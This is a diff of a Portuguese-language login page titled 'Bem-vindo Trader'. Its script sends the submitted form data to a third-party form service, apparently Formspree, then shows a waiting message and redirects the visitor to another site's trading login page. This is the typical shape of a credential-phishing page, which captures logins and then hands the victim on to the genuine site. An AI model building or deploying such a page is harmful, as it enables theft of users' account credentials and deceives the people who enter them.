@@ -5,60 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bem-vindo Trader</title>
     <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f7f7f7;
-        }
-        .login-container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            width: 300px;
-            text-align: center;
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            border-radius: 4px;
-            border: 1px solid #ccc;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #4CAF50;
-            border: none;
-            color: white;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .message-container {
-            display: none;
-            padding: 20px;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            width: 300px;
-            text-align: center;
-            margin-top: 20px;
-        }
-        .message-container p {
-            color: green;
-            font-size: 16px;
-        }
+        /* Seu CSS permanece aqui */
     </style>
 </head>
 <body>
@@ -83,34 +30,34 @@
     </div>
 
     <script>
-        // Função chamada ao enviar o formulário
+        // Quando o formulário for enviado
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();  // Evita o envio tradicional do formulário
+            event.preventDefault(); // Impede o envio padrão do formulário
 
-            // Exibe a mensagem de espera
+            // Exibe a mensagem de aguardo
             document.getElementById('messageContainer').style.display = 'block';
 
-            // Cria um objeto FormData para enviar os dados do formulário
-            var formData = new FormData(this);
+            // Usa o método fetch para enviar o formulário de forma assíncrona
+            const formData = new FormData(this); // Coleta os dados do formulário
 
-            // Envia os dados para o Formspree usando fetch
             fetch(this.action, {
                 method: 'POST',
                 body: formData
             })
-            .then(function(response) {
+            .then(response => {
                 if (response.ok) {
-                    // Após o envio bem-sucedido, faz o redirecionamento para o site desejado
+                    // Se a resposta for bem-sucedida, redireciona para o site desejado
                     setTimeout(function() {
                         window.location.href = "https://tradeboosting.org/app/login.php"; 
-                    }, 2000); // Atraso de 2 segundos para o redirecionamento
+                    }, 2000); // Aguarda 2 segundos antes de redirecionar
                 } else {
-                    // Caso haja algum erro, pode exibir uma mensagem (opcional)
-                    alert("Houve um erro ao enviar os dados. Tente novamente.");
+                    // Se houver algum erro no envio, alerta ao usuário
+                    alert('Erro ao enviar os dados. Tente novamente.');
                 }
             })
-            .catch(function(error) {
-                alert("Erro ao enviar dados: " + error);
+            .catch(error => {
+                // Caso ocorra algum erro durante a requisição
+                alert('Erro ao tentar enviar os dados: ' + error.message);
             });
         });
     </script>
